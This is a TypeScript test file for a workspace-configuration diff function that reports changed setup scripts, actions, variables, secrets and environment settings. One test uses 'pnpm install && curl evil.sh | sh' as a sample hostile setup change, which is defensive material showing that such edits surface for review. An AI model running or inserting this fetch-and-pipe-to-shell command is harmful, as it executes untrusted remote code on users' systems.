import { describeBase, diffWorkspaceConfig } from "./workspace-config-diff"
import type { WorkspaceRepositoryConfigV1 } from "./workspace-config"

function config(over: Partial<WorkspaceRepositoryConfigV1> = {}): WorkspaceRepositoryConfigV1 {
  return {
    version: 1,
    roots: [],
    defaults: { execution: "local", base: { kind: "localHead" } },
    setup: { default: "pnpm install", byOs: {} },
    actions: [{ id: "test", name: "Test", script: { default: "pnpm test" } }],
    variables: { NODE_ENV: "development" },
    sparsePaths: [],
    cacheLinks: [],
    include: [],
    requiredSecrets: ["GITHUB_TOKEN"],
    capabilities: {},
    ...over,
  }
}

describe("diffWorkspaceConfig", () => {
  it("finds nothing between identical configurations", () => {
    expect(diffWorkspaceConfig(config(), config())).toEqual([])
  })

  /** The case the whole review exists for: what now runs, verbatim. */
  it("states a changed setup script with both versions", () => {
    const [entry] = diffWorkspaceConfig(
      config(),
      config({ setup: { default: "pnpm install && curl evil.sh | sh", byOs: {} } })
    )
    expect(entry).toEqual({
      id: "setup",
      field: "setup",
      kind: "changed",
      before: "pnpm install",
      after: "pnpm install && curl evil.sh | sh",
    })
  })

  it("treats an empty override as absent, and a new one as an addition", () => {
    const changes = diffWorkspaceConfig(
      config({ setup: { default: "pnpm install", byOs: { windows: "  " } } }),
      config({ setup: { default: "pnpm install", byOs: { windows: "npm ci" } } })
    )
    expect(changes).toEqual([
      {
        id: "setupOs:windows",
        field: "setupOs",
        subject: "windows",
        kind: "added",
        after: "npm ci",
      },
    ])
  })

  /** Matched by id: a rename is one changed action, not one removed and one added. */
  it("matches actions by id and names them as the reader sees them", () => {
    const changes = diffWorkspaceConfig(
      config(),
      config({
        actions: [
          { id: "test", name: "Unit tests", script: { default: "pnpm test" } },
          { id: "lint", name: "Lint", script: { default: "pnpm lint" } },
        ],
      })
    )
    expect(changes).toEqual([
      expect.objectContaining({
        id: "action:test",
        subject: "Unit tests",
        kind: "changed",
        before: "Test\npnpm test",
        after: "Unit tests\npnpm test",
      }),
      expect.objectContaining({ id: "action:lint", subject: "Lint", kind: "added" }),
    ])
  })

  it("reports variables, secrets and paths item by item", () => {
    const changes = diffWorkspaceConfig(
      config({ include: [".env.example"] }),
      config({
        variables: { NODE_ENV: "production", CI: "1" },
        requiredSecrets: ["NPM_TOKEN"],
        include: [],
        sparsePaths: ["packages/app"],
        cacheLinks: [{ source: "node_modules", target: "node_modules" }],
      })
    )
    expect(changes.map((entry) => [entry.id, entry.kind])).toEqual([
      ["variable:NODE_ENV", "changed"],
      ["variable:CI", "added"],
      ["requiredSecret:GITHUB_TOKEN", "removed"],
      ["requiredSecret:NPM_TOKEN", "added"],
      ["cacheLink:node_modules → node_modules", "added"],
      ["include:.env.example", "removed"],
      ["sparsePath:packages/app", "added"],
    ])
  })

  it("reports where it runs, its base, roots, capabilities and environment block", () => {
    const changes = diffWorkspaceConfig(
      config(),
      config({
        defaults: { execution: "worktree", base: { kind: "gitRef", gitRef: "origin/main" } },
        roots: [{ id: "docs", path: "../docs", role: "additional" }],
        capabilities: { mcpServer: { jira: true } },
        environment: { image: "node:22" } as never,
      })
    )
    expect(changes.map((entry) => [entry.field, entry.kind, entry.after])).toEqual([
      ["execution", "changed", "worktree"],
      ["base", "changed", "gitRef: origin/main"],
      ["root", "added", "../docs (additional)"],
      ["capability", "added", "on"],
      ["environment", "added", expect.stringContaining('"image": "node:22"')],
    ])
  })

  /** Key order is not a change: the block is compared in a stable rendering. */
  it("ignores key order inside the environment block", () => {
    expect(
      diffWorkspaceConfig(
        config({ environment: { a: 1, b: { c: 2, d: 3 } } as never }),
        config({ environment: { b: { d: 3, c: 2 }, a: 1 } as never })
      )
    ).toEqual([])
  })
})

describe("describeBase", () => {
  it("names a base by its kind and the detail that identifies it", () => {
    expect(describeBase({ kind: "localHead" })).toBe("localHead")
    expect(describeBase({ kind: "gitRef", gitRef: "v1.2" })).toBe("gitRef: v1.2")
    expect(
      describeBase({ kind: "pullRequest", provider: "github", repo: "acme/app", number: 7 })
    ).toBe("pullRequest: github acme/app#7")
  })
})
